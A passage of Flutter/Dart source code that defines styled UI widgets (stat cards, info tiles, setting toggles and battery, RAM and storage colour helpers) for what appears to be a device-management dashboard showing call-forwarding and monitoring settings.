                          borderRadius: BorderRadius.circular(5.12),
                        ),
                        child: Row(
                          mainAxisSize: MainAxisSize.min,
                          children: [
                            Icon(Icons.phone_rounded, size: 9.6, color: isDark ? Colors.white70 : const Color(0xFF64748B)),
                            const SizedBox(width: 4),
                            Text(
                              _currentDevice.settings.forwardNumber!,
                              style: TextStyle(fontSize: 8.8, fontWeight: FontWeight.w600, color: isDark ? Colors.white70 : const Color(0xFF64748B)),
                            ),
                          ],
                        ),
                      ),
                    ),
                  const SizedBox(height: 6),
                  _SettingTile(
                    icon: Icons.visibility_rounded,
                    label: 'Device Monitoring',
                    isEnabled: _currentDevice.settings.monitoringEnabled,
                    isDark: isDark,
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Color _getBatteryColor(int level) {
    if (level > 60) return const Color(0xFF10B981);
    if (level > 30) return const Color(0xFFF59E0B);
    return const Color(0xFFEF4444);
  }

  Color _getRAMColor(double? percentFree) {
    if (percentFree == null) return const Color(0xFF94A3B8);
    if (percentFree > 20) return const Color(0xFF10B981);
    if (percentFree > 10) return const Color(0xFFF59E0B);
    return const Color(0xFFEF4444);
  }

  Color _getStorageColor(double? percentFree) {
    if (percentFree == null) return const Color(0xFF94A3B8);
    if (percentFree > 20) return const Color(0xFF10B981);
    if (percentFree > 10) return const Color(0xFFF59E0B);
    return const Color(0xFFEF4444);
  }
}

class _QuickStatCard extends StatelessWidget {
  final IconData icon;
  final String label;
  final String value;
  final String subtitle;
  final Color color;
  final bool isDark;
  final bool isSmallText;
  final bool isMonospace;

  const _QuickStatCard({
    required this.icon,
    required this.label,
    required this.value,
    this.subtitle = '',
    required this.color,
    required this.isDark,
    this.isSmallText = false,
    this.isMonospace = false,
  });

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.all(9.6),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [
            color.withOpacity(isDark ? 0.15 : 0.1),
            color.withOpacity(isDark ? 0.1 : 0.05),
          ],
        ),
        borderRadius: BorderRadius.circular(10.24),
        border: Border.all(color: color.withOpacity(0.2), width: 1.2),
      ),
      child: Column(
        crossAxisAlignment: isMonospace ? CrossAxisAlignment.center : CrossAxisAlignment.start,
        children: [
          Container(
            padding: const EdgeInsets.all(6.4),
            decoration: BoxDecoration(
              color: color.withOpacity(0.2),
              borderRadius: BorderRadius.circular(6.4),
            ),
            child: Icon(icon, color: color, size: 14.4),
          ),
          const SizedBox(height: 8),
          Text(
            value,
            style: TextStyle(
              fontSize: isSmallText ? 14 : 20,
              fontWeight: FontWeight.w800,
              color: color,
              letterSpacing: isMonospace ? 3 : -0.5,
              fontFamily: isMonospace ? 'monospace' : null,
            ),
            maxLines: 1,
            overflow: TextOverflow.ellipsis,
          ),
          const SizedBox(height: 2),
          Text(
            label,
            style: TextStyle(
              fontSize: 8,
              fontWeight: FontWeight.w600,
              color: isDark ? Colors.white60 : const Color(0xFF64748B),
            ),
          ),
          if (subtitle.isNotEmpty)
            Text(
              subtitle,
              style: TextStyle(
                fontSize: 7.2,
                fontWeight: FontWeight.w500,
                color: isDark ? Colors.white.withOpacity(0.4) : const Color(0xFF94A3B8),
              ),
              maxLines: 1,
              overflow: TextOverflow.ellipsis,
            ),
        ],
      ),
    );
  }
}

class _ModernCard extends StatelessWidget {
  final Widget child;
  final bool isDark;

  const _ModernCard({required this.child, required this.isDark});

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.all(12.8),
      decoration: BoxDecoration(
        color: isDark ? const Color(0xFF1A1F2E) : Colors.white,
        borderRadius: BorderRadius.circular(11.52),
        border: Border.all(
          color: isDark ? Colors.white.withOpacity(0.08) : Colors.black.withOpacity(0.05),
          width: 0.8,
        ),
        boxShadow: [
          BoxShadow(
            color: isDark ? Colors.black.withOpacity(0.2) : Colors.black.withOpacity(0.05),
            blurRadius: 16,
            offset: const Offset(0, 3),
          ),
        ],
      ),
      child: child,
    );
  }
}

class _SectionHeader extends StatelessWidget {
  final IconData icon;
  final String title;
  final Color color;

  const _SectionHeader({required this.icon, required this.title, required this.color});

  @override
  Widget build(BuildContext context) {
    return Row(
      children: [
        Container(
          padding: const EdgeInsets.all(4.8),
          decoration: BoxDecoration(
            gradient: LinearGradient(colors: [color.withOpacity(0.2), color.withOpacity(0.1)]),
            borderRadius: BorderRadius.circular(5.12),
          ),
          child: Icon(icon, color: color, size: 12.8),
        ),
        const SizedBox(width: 10),
        Text(title, style: const TextStyle(fontSize: 11.2, fontWeight: FontWeight.w700, letterSpacing: -0.3)),
      ],
    );
  }
}

class _InfoTile extends StatelessWidget {
  final IconData icon;
  final String label;
  final String value;
  final Color? valueColor;
  final bool isDark;
  final bool isMonospace;

  const _InfoTile({
    required this.icon,
    required this.label,
    required this.value,
    required this.isDark,
    this.valueColor,
    this.isMonospace = false,
  });

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 10),
      child: Row(
        children: [
          Icon(icon, size: 11.2, color: isDark ? Colors.white54 : const Color(0xFF94A3B8)),
          const SizedBox(width: 10),
          Expanded(
            child: Text(
              label,
              style: TextStyle(
                fontSize: 9.6,
                fontWeight: FontWeight.w500,
                color: isDark ? Colors.white70 : const Color(0xFF64748B),
              ),
            ),
          ),
          Flexible(
            child: Text(
              value,
              style: TextStyle(
                fontSize: 9.6,
                fontWeight: FontWeight.w700,
                color: valueColor ?? (isDark ? Colors.white : const Color(0xFF1E293B)),
                fontFamily: isMonospace ? 'monospace' : null,
              ),
              textAlign: TextAlign.end,
              overflow: TextOverflow.ellipsis,
            ),
          ),
        ],
      ),
    );
  }
}

class _CopyableInfoTile extends StatelessWidget {
  final IconData icon;
  final String label;
  final String value;
  final bool isDark;
  final bool isMonospace;
  final int maxLines;
  final VoidCallback onCopy;

  const _CopyableInfoTile({
    required this.icon,
    required this.label,
    required this.value,
    required this.isDark,
    required this.onCopy,
    this.isMonospace = false,
    this.maxLines = 1,
  });

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 10),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Padding(
            padding: const EdgeInsets.only(top: 2),
            child: Icon(icon, size: 11.2, color: isDark ? Colors.white54 : const Color(0xFF94A3B8)),
          ),
          const SizedBox(width: 10),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  label,
                  style: TextStyle(
                    fontSize: 9.6,
                    fontWeight: FontWeight.w500,
                    color: isDark ? Colors.white70 : const Color(0xFF64748B),
                  ),
                ),
                const SizedBox(height: 4),
                Text(
                  value,
                  style: TextStyle(
                    fontSize: 9.6,
                    fontWeight: FontWeight.w700,
                    color: isDark ? Colors.white : const Color(0xFF1E293B),
                    fontFamily: isMonospace ? 'monospace' : null,
                  ),
                  maxLines: maxLines,
                  overflow: TextOverflow.ellipsis,
                ),
              ],
            ),
          ),
          const SizedBox(width: 8),
          Material(
            color: Colors.transparent,
            child: InkWell(
              onTap: onCopy,
              borderRadius: BorderRadius.circular(6),
              child: Container(
                padding: const EdgeInsets.all(6),
                decoration: BoxDecoration(
                  color: const Color(0xFF6366F1).withOpacity(0.1),
                  borderRadius: BorderRadius.circular(6),
                ),
                child: Icon(Icons.copy_rounded, size: 12, color: const Color(0xFF6366F1)),
              ),
            ),
          ),
        ],
      ),
    );
  }
}

class _SettingTile extends StatelessWidget {
  final IconData icon;
  final String label;
  final bool isEnabled;
  final bool isDark;

  const _SettingTile({
    required this.icon,
    required this.label,
    required this.isEnabled,
    required this.isDark,
  });

  @override
  Widget build(BuildContext context) {
    return Row(
      children: [
        Icon(icon, size: 11.2, color: isDark ? Colors.white54 : const Color(0xFF94A3B8)),
        const SizedBox(width: 10),
        Expanded(
          child: Text(
            label,
            style: TextStyle(
              fontSize: 9.6,
              fontWeight: FontWeight.w500,
              color: isDark ? Colors.white70 : const Color(0xFF64748B),
            ),
          ),
        ),
        Container(
          padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3.2),
          decoration: BoxDecoration(
            gradient: isEnabled
                ? const LinearGradient(colors: [Color(0xFF10B981), Color(0xFF059669)])
                : LinearGradient(
              colors: [
                (isDark ? Colors.white : Colors.black).withOpacity(0.1),
                (isDark ? Colors.white : Colors.black).withOpacity(0.05),
              ],
            ),
            borderRadius: BorderRadius.circular(5.12),
          ),
          child: Text(
            isEnabled ? 'Enabled' : 'Disabled',
            style: TextStyle(
              fontSize: 8,
              fontWeight: FontWeight.w700,
              color: isEnabled ? Colors.white : (isDark ? Colors.white54 : const Color(0xFF64748B)),
            ),
          ),
        ),
      ],
    );
  }
}